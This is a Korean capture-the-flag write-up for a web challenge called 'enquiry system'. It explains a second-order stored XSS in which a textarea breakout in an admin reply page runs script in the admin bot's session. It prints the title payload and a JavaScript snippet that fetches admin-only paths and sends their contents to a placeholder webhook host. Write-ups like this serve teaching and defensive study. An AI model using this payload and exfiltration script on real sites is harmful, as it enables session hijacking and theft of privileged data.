---
title: "[Hypersonic CTF] enquiry system Writeup"
date: 2026-06-09 00:00:00 +0900
categories: [ctf, web]
tags: [writeup, web, xss]
ctf_event: "Hypersonic CTF (2026.06.07)"
challenge: "enquiry system"
challenge_category: web
toc: true
comments: false
---

## Flag

```text
HS{b8b844df78d7f1a99c423d3d87d4e8231a7c64e6f5fec392b3e3ba13271652b8}
```

## Summary

이 문제는 문의 시스템과 관리자 봇으로 구성되어 있다.

- Web: `old.waivey.kr:50012`
- Bot: `old.waivey.kr:50013`

일반 사용자 화면에서는 문의 제목, 본문, 답변이 HTML escape되어 바로 XSS가 실행되지 않는다.
하지만 관리자 페이지에서 기존 답변을 다시 표시할 때 `<textarea>` 컨텍스트 escape가 부족해서, 저장된 답변을 이용한 second-order XSS가 가능했다.

## Vulnerability

관리자 봇은 사용자가 등록한 문의를 확인한 뒤 다음과 같은 기본 답변을 저장한다.

```text
"<title>" 답변
안녕하세요. 문의 주신 내용 확인했습니다.
...
```

따라서 문의 title에 HTML payload를 넣으면 첫 번째 봇 방문 시 payload가 답변 안에 저장된다.

이후 두 번째 봇 방문에서 관리자 페이지가 기존 답변을 `<textarea>` 안에 렌더링할 때, 답변 안의 `</textarea>`가 실제 HTML로 해석되어 textarea를 탈출한다.
그 뒤 `<script>`가 실행되며, 이 스크립트는 관리자 봇의 세션으로 동작한다.

## Exploit

### 1. XSS payload를 title에 삽입

문의 title에 다음 payload를 넣었다.

```html
</textarea><script src=//<webhook-url>></script>
```

첫 번째 봇 방문 후 저장되는 답변은 대략 다음 형태가 된다.

```html
"</textarea><script src=//<webhook-url>></script>" 답변
안녕하세요. 문의 주신 내용 확인했습니다.
...
```

### 2. 두 번째 봇 방문으로 second-order XSS 실행

두 번째 봇 방문 시 기존 답변이 관리자 페이지의 `<textarea>`에 들어가면서 payload가 실행된다.

외부 JS는 다음처럼 admin 전용 경로를 fetch하고 webhook으로 전송했다.

```js
(async () => {
  for (p of [
    "/admin",
    "/admin/",
    "/admin/inquiry/guide",
    "/admin/inquiry",
    "/admin/inquiries",
    "/admin/inquiry/list",
    "/admin/flag",
    "/admin/secret",
    "/flag",
    "/flag.txt"
  ]) {
    try {
      r = await fetch(p);
      t = await r.text();
      navigator.sendBeacon(
        "//<webhook-url>/dump?p=" +
          encodeURIComponent(p) +
          "&s=" +
          r.status,
        t
      );
    } catch (e) {
      navigator.sendBeacon(
        "//<webhook-url>/err?p=" +
          encodeURIComponent(p),
        String(e)
      );
    }
  }
})();
```

## Result

`/admin/inquiry/guide`에서 flag가 노출되었다.

```text
HS{b8b844df78d7f1a99c423d3d87d4e8231a7c64e6f5fec392b3e3ba13271652b8}
```

## Root Cause

답변을 HTML textarea에 다시 넣을 때 안전하게 escape하지 않아 `</textarea>` 기반 HTML breakout이 가능했다.

즉, 최초 입력값은 일반 문의 화면에서는 escape되지만, 관리자 답변 화면의 기존 answer 렌더링 지점에서 컨텍스트에 맞는 escaping이 누락되어 stored XSS로 이어졌다.
